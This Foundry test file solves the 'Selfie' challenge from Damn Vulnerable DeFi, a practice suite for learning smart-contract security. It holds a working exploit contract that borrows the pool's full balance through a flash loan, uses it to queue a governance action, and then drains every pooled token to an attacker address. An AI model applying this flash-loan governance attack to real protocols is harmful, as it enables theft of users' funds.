// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableTokenSnapshot.sol";

import "src/Selfie/SimpleGovernance.sol";
import "src/Selfie/SelfiePool.sol";

// Challenge #6 - Selfie
// https://www.damnvulnerabledefi.xyz/challenges/selfie/

contract Attack is Test {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;

    address public hacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("hacker"))))));

    uint256 public constant TOKEN_INITIAL_SUPPLY = 2000000 * 1e18;
    uint256 public constant TOKENS_IN_POOL = 1500000 * 1e18;

    function setUp() public {
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(governance));

        token.transfer(address(pool), TOKENS_IN_POOL);
        token.snapshot();

        assertEq(governance.getActionCounter(), 1);
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function testEploit() public {
        // Attack Code:
        Exploit exploit = new Exploit(token, governance, pool, hacker);
        exploit.getLoan();
        vm.warp(2 days + 1);
        exploit.execute();

        assertEq(token.balanceOf(hacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}

contract Exploit is IERC3156FlashBorrower {
    DamnValuableTokenSnapshot public token;
    SimpleGovernance public governance;
    SelfiePool public pool;
    address public hacker;
    uint256 public amount;

    constructor(DamnValuableTokenSnapshot _token, SimpleGovernance _governance, SelfiePool _pool, address _hacker) {
        token = _token;
        governance = _governance;
        pool = _pool;
        hacker = _hacker;
    }

    function getLoan() public {
        amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", hacker);
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), amount, data);
    }

    function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata data) public returns (bytes32) {
        require(token.balanceOf(address(this)) == amount, "Get Loan Failed");
        uint256 id = token.snapshot();
        require(id == 2, "Create snapshot failed");
        governance.queueAction(address(pool), 0, data);
        uint256 count = governance.getActionCounter();
        require(count == 2, "Queue action failed");
        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function execute() public {
        governance.executeAction(1);
    }
}
